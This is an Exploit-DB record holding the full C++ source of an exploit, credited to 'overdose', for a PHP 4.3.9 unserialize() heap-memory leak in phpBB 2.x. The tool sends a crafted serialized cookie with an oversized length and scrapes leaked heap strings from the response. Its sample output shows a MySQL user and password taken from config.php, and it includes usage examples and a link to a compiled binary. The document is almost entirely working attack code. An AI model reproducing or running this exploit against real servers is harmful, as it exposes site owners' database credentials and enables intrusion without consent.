{
  "id": "697",
  "title": "PHP 4.3.9 + phpBB 2.x - &#039;Unserialize()&#039; Remote Information Leak",
  "cve": null,
  "vuln_type": "rce",
  "code": "// Compiled version: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/697.rar (phpbbmemorydump.rar)\r\n// Source serv.cpp is at the bottom of the page - str0ke\r\n\r\n// Notes from author:\r\n//      compile with borland c++ (freecommandlinetools) :\r\n//               bcc32 -c serv.cpp\r\n//               bcc32 bbmemorydump.cpp serv.obj\r\n\r\n/*\r\n       *** coded by overdose ***\r\n       slythers@gmail.com\r\n       php bug in ext/standart/var_unserializer.c http://www.securityfocus.com/archive/1/384663/2004-12-13/2004-12-19/0\r\n       for read heap memorie with phpbb2 ;>\r\n       tested : phpbbmemorydump.exe \"http://site.com/phpbb/\" 30000 -cookiename=phpbb2support > a.txt\r\n       result:\r\n               - string detected : /home/virtual/site.com/phpBB/config.php\r\n               - string detected : dbname\r\n               - string detected : PT_N\r\n               - string detected : phpbb\r\n               - string detected : dbuser\r\n               - string detected : phpbb  << mysql user\r\n               - string detected : dbpasswd\r\n               - string detected : phpBB_R0cKs << mysql password\r\n               - string detected : table_prefix\r\n               - string detected : phpbb_\r\n       use like :\r\n               phpbbmemorydump.exe \"http://site.com/phpbb2/\" nboctettoreadinheap [repeat/display_all_heap] [-cookiename=phpbb2mysql]\r\n       greetz:\r\n       my crew MWA\r\n       pull the plug , vortex challenge\r\n       www.security-challenge.com\r\n       http://overdose.tcpteam.org/\r\n       slipknot , dr dre , ...\r\n       all #s-c and all i forget\r\n       compile with borland c++ (freecommandlinetools) :\r\n               bcc32 -c serv.cpp\r\n               bcc32 bbmemorydump.cpp serv.obj\r\n*/\r\n#include <winsock.h>\r\n#include <iostream.h>\r\nclass serveur\r\n{\r\n public:\r\n bool createsocket();\r\n bool listen(unsigned short port,unsigned int nbwaitconnect);\r\n serveur * waitconnect();\r\n bool connectsocket(char *dns,unsigned short port);\r\n bool socketsend(char *envoi);\r\n bool getword(char in[],unsigned int max);\r\n bool getword(char in2[]);\r\n bool getline(char buf[],unsigned int maxcara);\r\n bool getline(char buf2[]);\r\n bool ifgetchar(char *caraif);\r\n bool ifchargetnb(char ligne[],unsigned int aumax);\r\n bool ifchargetline(char ligne[],unsigned int lemax);\r\n bool ifchargetline(char ligne[]);\r\n bool getnb(char *vect,unsigned int nb);\r\n bool sendnb(char *vec,unsigned int longueur);\r\n bool isconnect();\r\n int getnumsock();\r\n void closesock();\r\n bool createbytheclass(int thesock,struct sockaddr_in thestruct);\r\n unsigned int maxread;\r\n unsigned int seconde;\r\n unsigned int microseconde;\r\n serveur();\r\n ~serveur();\r\n void operator << (char *chaine);\r\n void operator >> (char *read);\r\n\r\n private:\r\n bool connected;\r\n bool create;\r\n struct sockaddr_in mysock;\r\n int sock;\r\n\r\n};\r\n#define HTTP_PORT 80\r\n#define SIGNATURE_REQUEST signaturequete\r\n#define SIGNATURE_REQUEST_START \"\\nSet-Cookie: \"\r\n#define DEFAULT_COOKIE_NAME \"phpbb2mysql\"\r\n#define END_SIGNATURE \"_data=\"\r\n#define MIN_NB_LETTRE 3\r\n#define NB_SEC_FOR_WAIT 1000*5 // 5 secondes\r\nchar signaturequete[512];\r\nstruct url{\r\n       char *dns;\r\n       char *uri;\r\n       unsigned short port;\r\n};\r\n\r\nstruct url parseurl(char *of);\r\nchar * intostr(int erf);\r\nbool goodcar(char carac);\r\nunsigned int utf8decode(char *utf);\r\nchar alphanum(char *of,bool *wesh);\r\nint main(int argc,char **argv)\r\n{\r\n       struct url urlparsed;\r\n       serveur http;\r\n       unsigned int nbmemread;\r\n       char car;\r\n       bool repeat = 0;\r\n       bool displayheap = 0;\r\n       char *cookname = DEFAULT_COOKIE_NAME;\r\n       WSAData wsadata;\r\n       if (WSAStartup(MAKEWORD(2, 0),&wsadata) != 0)\r\n               return 1;\r\n       cout <<\"coded by overdose / bad boyz coding\"<<endl;\r\n\r\n       if(argc < 3)\r\n       {\r\n               cout <<\"Example: phpbbmemorydump.exe http://site.com/phpbb/ 30000 -cookiename=phpbb2support > a.txt\"<<endl;\r\n               return 0;\r\n       };\r\n\r\n       for(int argcpt = 3;argcpt < argc;argcpt++)\r\n       {\r\n               if(!strcmp(argv[argcpt],\"repeat\"))\r\n                       repeat = 1;\r\n               else if(!strcmp(argv[argcpt],\"display_all_heap\"))\r\n                       displayheap = 1;\r\n               else if(!strncmp(argv[argcpt],\"-cookiename=\",sizeof(\"-cookiename=\")-1))\r\n               {\r\n                       cookname= argv[argcpt] + sizeof(\"-cookiename=\")-1;\r\n               };\r\n       };\r\n\r\n       strcpy(SIGNATURE_REQUEST,SIGNATURE_REQUEST_START);\r\n       strcat(SIGNATURE_REQUEST,cookname);\r\n       strcat(SIGNATURE_REQUEST,END_SIGNATURE);\r\n       nbmemread = atoi(argv[2]);\r\n \r\n       if(!nbmemread)\r\n               return 0;\r\n       urlparsed = parseurl(argv[1]);\r\n       if(!urlparsed.uri)\r\n               return 0;\r\n       do{\r\n               http.createsocket();\r\n  \r\n               if(!http.connectsocket(urlparsed.dns,urlparsed.port))\r\n               {\r\n                       cout << \"can't connect to \"<<urlparsed.dns<<endl;\r\n                       return 0;\r\n               };\r\n\r\n               http << \"GET \" ;\r\n               http << urlparsed.uri ;\r\n               http << \" HTTP/1.1\\nHost: \";\r\n               http << urlparsed.dns ;\r\n               http << \"\\nCookie: \";\r\n               http << cookname;\r\n               http << \"_data=s:\";\r\n               http << intostr(nbmemread);\r\n               http << \":%22test1%22%3b; expires=Fri, 24-Dec-2005 21:25:37 GMT; path=/; domain=\";\r\n               http << urlparsed.dns;\r\n               http << \"\\nCookie: \";\r\n               http << cookname;\r\n               http << \"_sid=1cfd759c33ba2a45b994c7b7cfd948ec; path=/; domain=\";\r\n               http << urlparsed.dns;\r\n               http << \"\\nAccept-Language: fr\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\nConnection: close\\n\\n\";\r\n  \r\n               cout <<\"requete effectuer ...\"<<endl;\r\n               char signature[sizeof(SIGNATURE_REQUEST)];\r\n               char *word,*wtmp;\r\n               unsigned int cpt ,sizesign;\r\n               unsigned int compteur,cptstr;\r\n               bool exit = 0;\r\n               sizesign = strlen(SIGNATURE_REQUEST);\r\n               memset(signature,'a',sizesign);\r\n               signature[sizesign] ='\\0';\r\n               compteur = 0;\r\n               cptstr = 0;\r\n               while(!exit && http.getnb(&car,sizeof(char)))\r\n               {\r\n                       // ajout du detecteur de heap\r\n                       for(cpt = 0; cpt < (sizesign-1);cpt++)\r\n                               signature[cpt] = signature[cpt+1];\r\n                       signature[sizesign-1] = car;\r\n                       if(!strcmp(signature,SIGNATURE_REQUEST))\r\n                       {\r\n                               word = new char[nbmemread*3+1];\r\n                               word[cptstr] = '\\0';\r\n                               compteur = strlen(intostr(nbmemread)) + 4;\r\n                               for(cpt = 0; cpt < compteur;cpt++)\r\n                                       http.getnb(&car,sizeof(char));\r\n                               while(!exit && http.getnb(&car,sizeof(char)))\r\n                               {\r\n                                       if((car == ';') || (cptstr >= (nbmemread*3)))\r\n                                       {\r\n                                               exit = 1;\r\n                                               continue;\r\n                                       };\r\n                                       word[cptstr] = car;\r\n                                       cptstr++;\r\n                                       word[cptstr] ='\\0';\r\n                               };\r\n                               if(displayheap)\r\n                                       cout << word<<endl;\r\n                               nbmemread = utf8decode(word);\r\n                               for(compteur = 0;compteur < nbmemread;)\r\n                               {\r\n                                       for(cpt=compteur;goodcar(word[cpt]);cpt++);\r\n                                       if((cpt - compteur) > MIN_NB_LETTRE )\r\n                                       {\r\n                                               wtmp = new char[(cpt - compteur)+1];\r\n                                               strncpy(wtmp,&word[compteur],cpt - compteur);\r\n                                               wtmp[cpt - compteur] = '\\0';\r\n                                               cout <<\"- string detected : \" <<wtmp<<endl;\r\n                                               delete[] wtmp;\r\n                                       }\r\n                                       if(!(cpt - compteur))\r\n                                               cpt++;\r\n                                       compteur = cpt;\r\n                               };\r\n                               delete[] word;\r\n                       };\r\n               };\r\n               http.closesock();\r\n               if(repeat)\r\n               {\r\n                       cout <<endl<<\"attente jusqu'a la prochaine requete ...\"<<endl;\r\n                       Sleep(NB_SEC_FOR_WAIT);\r\n               };\r\n       }while(repeat);\r\n       /*\r\n       delete[] urlparsed.uri; // removed extra \\n's milw0rm.com\r\n       delete[] urlparsed.dns;\r\n       */\r\n       WSACleanup();\r\n       return 0;\r\n}\r\nstruct url parseurl(char *of)\r\n{\r\n       struct url retour;\r\n       unsigned int taille;\r\n       char tmp;\r\n       retour.dns = 0x00;\r\n       retour.uri = 0x00;\r\n       retour.port = HTTP_PORT ;\r\n       while( *of && (*of != ':'))\r\n               of++;\r\n       if(*of && *(of+1) && *(of+2))\r\n       {\r\n               if((*(of+1) != '/') || (*(of+2) != '/'))\r\n                       return retour;\r\n               of += 3;\r\n               for(taille = 0; (of[taille] != '/') && (of[taille] != '\\0') && (of[taille] != ':');taille++);\r\n               retour.dns = new char [taille+1];\r\n               memcpy(retour.dns,of,taille);\r\n               retour.dns[taille] = '\\0';\r\n               of += taille;\r\n               if(*of == ':')\r\n               {\r\n                       of++;\r\n                       for(taille = 0; (of[taille] != '/') && (of[taille] != '\\0');taille++);\r\n                       tmp = of[taille];\r\n                       of[taille] = '\\0';\r\n                       if(taille)\r\n                               retour.port = atoi(of);\r\n                       of[taille] = tmp;\r\n                       of += taille;\r\n               };\r\n               if(!*of)\r\n               {\r\n                       retour.uri = new char[2];\r\n                       strcpy(retour.uri,\"/\");\r\n               }\r\n               else\r\n               {\r\n                       retour.uri = new char [strlen(of)+1];\r\n                       strcpy(retour.uri,of);\r\n               };\r\n       };\r\n       return retour;\r\n}\r\nchar * intostr(int erf)\r\n{\r\n       char *chaine;\r\n       int puissance;\r\n       int erf2;\r\n       if( erf >= 0)\r\n       {\r\n               puissance =0;\r\n               for(int kekette = 1;kekette<=erf;kekette = kekette*10)\r\n               {\r\n                       puissance++;\r\n               };\r\n               if (puissance == 0)\r\n               {\r\n                       puissance = 1;\r\n               };\r\n               chaine = new char[puissance+1];\r\n               chaine[puissance] ='\\0';\r\n               for(int arf = puissance-1;arf >=0;arf--)\r\n               {\r\n                       erf2 = erf % 10 ;\r\n                       chaine[arf] = '0' + erf2;\r\n                       erf = erf /10;\r\n               };\r\n               return chaine;\r\n       }\r\n       else\r\n               return 0;\r\n}\r\nbool goodcar(char carac)\r\n{\r\n       unsigned short cpt;\r\n       if(!carac)\r\n               return 0;\r\n       // i hate do like this :/\r\n       char *goodcar = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMONPQRSTUVWXYZ012345689<>\u00e9@\u00e0)]=}\u00e8[_-{#&*\\\\/-+~'\u00e7$%.:;|^~$,!?\\\"\\'\\t\\r\\n \";\r\n       for(cpt = 0;(goodcar[cpt] != '\\0') && (goodcar[cpt] != carac);cpt++);\r\n       if(goodcar[cpt] == carac)\r\n               return 1;\r\n       return 0;\r\n}\r\n\r\nunsigned int utf8decode(char *utf)\r\n{\r\n       char *r;\r\n       char *w;\r\n       char tmp;\r\n       bool han;\r\n       r = w = utf;\r\n       while(*r)\r\n       {\r\n               if(*r =='%')\r\n               {\r\n                       tmp = alphanum(r+1,&han);\r\n                       if(han)\r\n                       {\r\n                               *w = tmp;\r\n                               r += 2;\r\n                       }\r\n                       else\r\n                               *w = *r;\r\n               }\r\n               else\r\n                       *w = *r;\r\n               w++;\r\n               r++;\r\n       };\r\n       *w = '\\0';\r\n       return (w-utf);\r\n}\r\n\r\nchar alphanum(char *of,bool *wesh)\r\n{\r\n       unsigned char retour;\r\n       retour = 0x00;\r\n       *wesh = 0;\r\n       if(!(*of && *(of+1)))\r\n               return 0x00;\r\n       if((*of >= 'a') && (*of <= 'f'))\r\n               retour = ((*of - 'a') +10) * 0x10;\r\n       else if((*of >= 'A') && (*of <= 'F'))\r\n               retour = ((*of - 'A') +10) * 0x10;\r\n       else if((*of >= '0') && (*of <= '9'))\r\n               retour = (*of - '0') * 0x10;\r\n       else\r\n               return 0x00;\r\n       of++;\r\n       if((*of >= 'a') && (*of <= 'f'))\r\n               retour += ((*of - 'a') +10);\r\n       else if((*of >= 'A') && (*of <= 'F'))\r\n               retour += ((*of - 'A') +10);\r\n       else if((*of >= '0') && (*of <= '9'))\r\n               retour += (*of - '0');\r\n       else\r\n               return 0x00;\r\n       *wesh = 1;\r\n       return retour;\r\n}\r\n\r\n//////////////////////////////////\r\n\r\n/*\r\n#include <winsock.h>\r\n#include <string.h>\r\n\r\nclass serveur\r\n{\r\n\tpublic:\r\n\t\tbool createsocket();\r\n\t\tbool listen(unsigned short port,unsigned int nbwaitconnect);\r\n\t\tserveur * waitconnect();\r\n\t\tbool connectsocket(char *dns,unsigned short port);\r\n\t\tbool socketsend(char *envoi);\r\n\t\tbool getword(char in[],unsigned int max);\r\n\t\tbool getword(char in2[]);\r\n\t\tbool getline(char buf[],unsigned int maxcara);\r\n\t\tbool getline(char buf2[]);\r\n\t\tbool ifgetchar(char *caraif);\r\n\t\tbool ifchargetnb(char ligne[],unsigned int aumax);\r\n\t\tbool ifchargetline(char ligne[],unsigned int lemax);\r\n\t\tbool ifchargetline(char ligne[]);\r\n\t\tbool getnb(char *vect,unsigned int nb);\r\n\t\tbool sendnb(char *vec,unsigned int longueur);\r\n\t\tbool isconnect();\r\n\t\tint getnumsock();\r\n\t\tvoid closesock();\r\n\t\tbool createbytheclass(int thesock,struct sockaddr_in thestruct);\r\n\t\tunsigned int maxread;\r\n\t\tunsigned int seconde;\r\n\t\tunsigned int microseconde;\r\n\t\tserveur();\r\n\t\t~serveur();\r\n\t\tvoid operator << (char *chaine);\r\n\t\tvoid operator >> (char *read);\r\n\t\t\r\n\tprivate:\r\n\t\tbool connected;\r\n\t\tbool create;\r\n\t\tstruct sockaddr_in mysock;\r\n\t\tint sock;\r\n\t\t\r\n};\r\n\r\n\r\nbool serveur::createsocket()\r\n{\r\n\tif (create)\r\n\t\treturn 0;\r\n\tsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\r\n\tif(sock <0)\r\n\t{\r\n\t\tcreate = 0;\r\n\t\treturn 0;\r\n\t};\r\n\tcreate = 1;\r\n\treturn sock;\r\n}\r\n\r\nbool serveur::listen(unsigned short port, unsigned int nbwaitconnect)\r\n{\r\n\tint test;\r\n\tmemset(&mysock, 0, sizeof(mysock));\r\n\tmysock.sin_family = AF_INET ;\r\n\tmysock.sin_addr.s_addr = htonl(INADDR_ANY);\r\n\tmysock.sin_port = htons(port);\r\n\ttest = bind(sock,(sockaddr *) &mysock,sizeof(mysock));\r\n\tif (test <0)\r\n\t{\r\n\t\tclosesock();\r\n\t\treturn 0;\r\n\t};\r\n\tlisten(sock,nbwaitconnect);\r\n\treturn 1;\r\n}\r\n\r\nserveur * serveur::waitconnect()\r\n{\r\n\tstruct sockaddr_in astruct;\r\n\tint taille;\r\n\tint asock;\r\n\tserveur * newsock ;\r\n\ttaille = sizeof(astruct);\r\n\tasock = accept(sock, (sockaddr *) &astruct,&taille);\r\n\tnewsock = new serveur ;\r\n\tnewsock->createbytheclass(asock,astruct);\r\n\treturn newsock;\r\n}\r\n\r\nbool serveur::connectsocket(char *dns,unsigned short port)\r\n{\r\n\tstruct hostent *hoste;\r\n\tint test;\r\n\tmemset(&mysock, 0, sizeof(mysock));\r\n\tif(!(hoste = gethostbyname(dns)))\r\n\t\tmysock.sin_addr.s_addr = inet_addr(dns);\r\n\telse\r\n\t\tmemcpy(&(mysock.sin_addr),hoste->h_addr,hoste->h_length);\r\n\tmysock.sin_family = AF_INET ;\r\n\tmysock.sin_port = htons(port);\r\n\ttest = connect(sock,(struct sockaddr *) &mysock , sizeof(mysock));\r\n\tif(test <0)\r\n\t\treturn 0;\r\n\tconnected = 1;\r\n\treturn 1;\r\n};\r\n\r\nbool serveur::socketsend(char *envoi)\r\n{\r\n\tint veri;\r\n\tint taiverif;\r\n\tif(!connected)\r\n\t\treturn 0;\r\n\tveri = strlen(envoi);\r\n\ttaiverif = send(sock,envoi,veri,0);\r\n\tif(veri != taiverif)\r\n\t{\r\n\t\tconnected = 0;\r\n\t\treturn 0;\r\n\t};\r\n\treturn 1;\r\n}\r\n\r\nbool serveur::getline(char buf[],unsigned int maxcara)\r\n{\r\n\tunsigned int testing;\r\n\tunsigned int curseur;\r\n\tchar recoi;\r\n\tif(!connected)\r\n\t\treturn 0;\r\n\tcurseur = 0;\r\n\tdo{\r\n\t\ttesting = recv(sock,&recoi,sizeof(char),0);\r\n\t\tif(testing != sizeof(char))\r\n\t\t{\r\n\t\t\tbuf[curseur] = '\\0' ;\r\n\t\t\tconnected = 0;\r\n\t\t\treturn 0;\r\n\t\t};\r\n\t\tif( curseur == maxcara)\r\n\t\t{\r\n\t\t\tbuf[curseur] = '\\0';\r\n\t\t};\r\n\t\tif ((curseur < maxcara)&&(recoi != '\\r')&&(recoi != '\\n'))\r\n\t\t{\r\n\t\t\tbuf[curseur] = recoi ;\r\n\t\t\tcurseur++ ;\r\n\t\t};\r\n\t}while(recoi != '\\n' );\r\n\tbuf[curseur] = '\\0' ;\r\n\treturn 1;\r\n}\r\n\r\nbool serveur::getline(char buf2[])\r\n{\r\n\treturn getline(buf2,maxread);\r\n}\r\n\r\nbool serveur::getword(char in[],unsigned int max)\r\n{\r\n\tint testing;\r\n\tunsigned int curseur;\r\n\tchar recoi;\r\n\tif(!connected)\r\n\t\treturn 0;\r\n\tcurseur = 0;\r\n\tdo{\r\n\t\ttesting = recv(sock,&recoi,sizeof(char),0);\r\n\t\tif(testing != sizeof(char))\r\n\t\t{\r\n\t\t\tin[curseur] = '\\0' ;\r\n\t\t\tconnected = 0;\r\n\t\t\treturn 0;\r\n\t\t};\r\n\t\tif( curseur == max)\r\n\t\t{\r\n\t\t\tin[curseur] = '\\0';\r\n\t\t};\r\n\t\tif ((curseur < max)&&(recoi != '\\r')&&(recoi != '\\n')&&(recoi != ' '))\r\n\t\t{\r\n\t\t\tin[curseur] = recoi ;\r\n\t\t\tcurseur++ ;\r\n\t\t};\r\n\t}while((recoi != '\\n') && (recoi != ' '));\r\n\tin[curseur] = '\\0' ;\r\n\treturn 1;\r\n}\r\n\r\nbool serveur::getword(char in2[])\r\n{\r\n\treturn getword(in2,maxread);\r\n}\r\n\r\nbool serveur::ifgetchar(char *caraif)\r\n{\r\n\tfd_set fdens;\r\n\tstruct timeval tv;\r\n\ttv.tv_sec = seconde ;\r\n\ttv.tv_usec = microseconde ;\r\n\tFD_ZERO(&fdens);\r\n\tFD_SET(sock,&fdens);\r\n\tselect(sock+1, &fdens, NULL, NULL, &tv);\r\n\tif(FD_ISSET(sock,&fdens))\r\n\t{\r\n\t\tif(!getnb(caraif,sizeof(char)))\r\n\t\t\tclosesock();\r\n\t\treturn 1;\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn 0;\r\n\t};\r\n}\r\n\r\nbool serveur::ifchargetnb(char ligne[],unsigned int aumax)\r\n{\r\n\tbool retour;\r\n\tretour = ifgetchar(ligne) ;\r\n\tif(retour)\r\n\t{\r\n\t\tconnected = getnb(ligne,aumax) ;\r\n\t};\r\n\treturn retour;\r\n}\r\n\r\nbool serveur::ifchargetline(char ligne[],unsigned int lemax)\r\n{\r\n\tbool retour;\r\n\tretour = ifgetchar(ligne) ;\r\n\tif(retour)\r\n\t{\r\n\t\tif(*ligne == '\\n')\r\n\t\t{\r\n\t\t\t*ligne = '\\0';\r\n\t\t\treturn 1;\r\n\t\t};\r\n\t\tif(*ligne != '\\r')\r\n\t\t\tligne++;\r\n\t\tconnected = getline(ligne,lemax) ;\r\n\t};\r\n\treturn retour;\r\n}\r\n\r\nbool serveur::ifchargetline(char ligne[])\r\n{\r\n\treturn ifchargetline(ligne,maxread);\r\n}\r\n\r\nbool serveur::getnb(char *vect,unsigned int nb)\r\n{\r\n\tunsigned int testing;\r\n\tunsigned int curseur;\r\n\tchar recoi;\r\n\tif(!connected)\r\n\t\treturn 0;\r\n\tcurseur = 0;\r\n\tdo{\r\n\t\ttesting = recv(sock,&recoi,sizeof(char),0);\r\n\t\tif(testing != sizeof(char))\r\n\t\t{\r\n\t\t\tvect[curseur] = '\\0' ;\r\n\t\t\tconnected = 0;\r\n\t\t\treturn 0;\r\n\t\t};\r\n\t\tif( curseur == nb)\r\n\t\t{\r\n\t\t\tvect[curseur] = '\\0';\r\n\t\t};\r\n\t\tif (curseur < nb)\r\n\t\t{\r\n\t\t\tvect[curseur] = recoi ;\r\n\t\t\tcurseur++ ;\r\n\t\t};\r\n\t}while(curseur < nb);\r\n\treturn 1;\r\n}\r\n\r\nbool serveur::sendnb(char *vec,unsigned int longueur)\r\n{\r\n\tint taiverif;\r\n\tif(!connected)\r\n\t\treturn 0;\r\n\ttaiverif = send(sock,vec,longueur,0);\r\n\tif((int)longueur != taiverif)\r\n\t{\r\n\t\tconnected = 0;\r\n\t\treturn 0;\r\n\t};\r\n\treturn 1;\r\n}\r\n\r\nint serveur::getnumsock()\r\n{\r\n\treturn sock;\r\n}\r\n\r\nbool serveur::createbytheclass(int thesock,struct sockaddr_in thestruct)\r\n{\r\n\tif(create)\r\n\t\treturn 0;\r\n\tsock = thesock ;\r\n\tmemcpy(&mysock,&thestruct,sizeof(thestruct));\r\n\tcreate = 1;\r\n\tconnected = 1;\r\n\treturn 1;\r\n}\r\n\r\nvoid serveur::closesock()\r\n{\r\n\tif(create) \r\n\t{\r\n\t\tclosesocket(sock);\r\n\t\tcreate = 0;\r\n\t\tconnected = 0;\r\n\t};\r\n}\r\n\r\nbool serveur::isconnect()\r\n{\r\n\treturn connected;\r\n}\r\n\r\nvoid serveur::operator << (char *chaine)\r\n{\r\n\tsocketsend(chaine);\r\n}\r\n\r\nvoid serveur::operator >> (char *read)\r\n{\r\n\tgetword(read);\r\n}\r\n\r\nserveur::serveur()\r\n{\r\n\tconnected = 0;\r\n\tcreate = 0 ;\r\n\tmaxread = 0xFFFFFFFF ;\r\n\tseconde = 0;\r\n\tmicroseconde = 0;\r\n\tcreatesocket();\r\n}\r\n\r\nserveur::~serveur()\r\n{\r\n\tif(connected)\r\n\t\tclosesock();\r\n}\r\n*/\r\n\r\n\r\n\r\n\r\n// milw0rm.com [2004-12-17]",
  "url": "https://www.exploit-db.com/exploits/697"
}